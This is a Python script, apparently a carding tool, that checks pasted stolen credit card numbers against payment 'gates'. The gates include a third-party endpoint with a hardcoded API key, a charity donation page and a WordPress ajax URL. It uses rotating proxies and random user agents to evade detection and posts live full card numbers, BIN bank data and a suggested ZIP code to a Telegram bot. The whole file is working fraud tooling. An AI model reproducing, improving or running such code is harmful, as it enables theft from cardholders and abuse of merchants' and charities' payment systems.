import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask

# --- RENDER SERVER SETUP ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 Proxy-Pro Edition is Running"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

init(autoreset=True)

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_killed = False
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        # --- PROXY LOADING ---
        self.proxies_list = self.load_proxies()
        
        self.pk = None
        self.cs = None
        self.mode = "Standard" 
        
        # --- ALL TARGETS SYNCED ---
        self.targets = {
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "Telegram Stars": "https://fragment.com/stars",
            "YouTube Premium": "https://www.youtube.com/premium",
            "Staples": "https://www.staples.com",
            "Tracfone": "https://www.tracfone.com",
            "Dribbble": "https://dribbble.com/pro",
            "Freemans": "https://www.freemans.com",
            "BikeComp": "https://www.bike-components.de",
            "FinerWorks": "https://finerworks.com",
            "Zolucky": "https://zolucky.com",
            "TradeChem": "https://trade-chem.co.uk",
            "DronesPerHour": "https://dronesperhour.com",
            "SouthernApp": "https://southernappliances.net",
            "CottonCreations": "https://cottoncreations.com",
            "Dharmatrading": "https://dharmatrading.com",
            "Reolink": "https://reolink.com",
            "BGMI UC": "https://www.midasbuy.com/midasbuy/ot/shop/bgmi"
        }

    def load_proxies(self):
        try:
            if os.path.exists("proxy.txt"):
                with open("proxy.txt", "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]
                print(Fore.CYAN + f"[*] Loaded {len(proxies)} proxies from proxy.txt")
                return proxies
            else:
                print(Fore.RED + "[!] proxy.txt not found! Please create it.")
                return []
        except: return []

    def get_proxy(self):
        if not self.proxies_list: return None
        proxy = random.choice(self.proxies_list)
        # Format support: ip:port OR ip:port:user:pass
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return {
                "http": f"http://{user}:{pwd}@{ip}:{port}",
                "https": f"http://{user}:{pwd}@{ip}:{port}"
            }
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def get_full_card_info(self, cc):
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            bank = res.get("bank", {}).get("name", "Unknown Bank")
            level = res.get("type", "Unknown").upper()
            brand = res.get("scheme", "Unknown").upper()
            country = res.get("country", {}).get("name", "Unknown")
            emoji = res.get("country", {}).get("emoji", "🌐")
            currency = res.get("country", {}).get("currency", "N/A")
            zip_code = "90001 (US)" if "United States" in country else "Verify Manual"
            
            return {
                "bank": bank, "level": level, "brand": brand,
                "country": f"{country} {emoji}", "currency": currency, "zip": zip_code
            }
        except: 
            return {"bank": "Unknown", "level": "Unknown", "brand": "Unknown", "country": "Unknown", "currency": "N/A", "zip": "N/A"}

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}
            requests.post(url, json=payload, timeout=10)
        except: pass

    def process_card(self, cc):
        if self.is_killed: return
        try:
            time.sleep(random.randint(3, 7))
            cc_clean = cc.replace(' ', '').strip()
            if not cc_clean: return
            
            srv_name = random.choice(list(self.targets.keys()))
            target_url = self.targets[srv_name]
            
            # Proxy Selection
            current_proxy = self.get_proxy()
            
            if self.mode == "PayPal":
                final_gate = f"https://binnaclehouse.org/donation/?amount=1&cc={cc_clean}"
            elif self.mode == "Authorize":
                final_gate = f"https://morgannasalchemy.com/wp-admin/admin-ajax.php?cc={cc_clean}"
            else:
                final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(target_url)}"

            headers = {'User-Agent': self.ua.random}
            
            # Request with Proxy Rotation
            resp = requests.get(final_gate, headers=headers, proxies=current_proxy, timeout=50)
            res_text = resp.text.lower()

            if any(x in res_text for x in ["succeeded", "charged", "success", "approved"]):
                info = self.get_full_card_info(cc_clean)
                msg = (
                    f"🔥 *{self.mode} HIT* 🔥\n\n"
                    f"💳 *Card:* `{cc_clean}`\n"
                    f"🏦 *Bank:* {info['bank']}\n"
                    f"🏆 *Level:* {info['brand']} - {info['level']}\n"
                    f"📍 *Location:* {info['country']}\n"
                    f"📬 *Suggested Zip:* `{info['zip']}`\n"
                    f"📱 *Target:* {srv_name}\n"
                    f"✅ *Status:* LIVE / APPROVED"
                )
                self.send_log(msg)
                print(Fore.GREEN + f"[HIT] {cc_clean} | {info['country']}")
            else:
                print(Fore.RED + f"[DEC] {cc_clean[:16]}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Connection Error/Proxy Timeout")

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(Fore.RED + "███████╗████████╗██████╗ ██╗██████╗ ███████╗")
        print(Fore.WHITE + "V30 ENGINE | PROXY-PRO & LOCATION SYNC")
        
        if not self.proxies_list:
            print(Fore.RED + "\n[!] STOP: No proxies found in proxy.txt!")
            return

        print(Fore.YELLOW + "\n1. Standard | 2. PayPal | 3. Authorize")
        choice = input("Select Mode: ")
        if choice == "2": self.mode = "PayPal"
        elif choice == "3": self.mode = "Authorize"

        print(Fore.CYAN + "\n[!] Paste cards (CC|MM|YY|CVV) and press Enter twice:")
        cards = []
        while True:
            line = input()
            if not line.strip(): break
            cards.append(line.strip())

        if not cards: return

        print(Fore.MAGENTA + f"[*] Checking {len(cards)} cards with Proxy Rotation...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.process_card, cards)

if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    UltimateMasterV30().run()
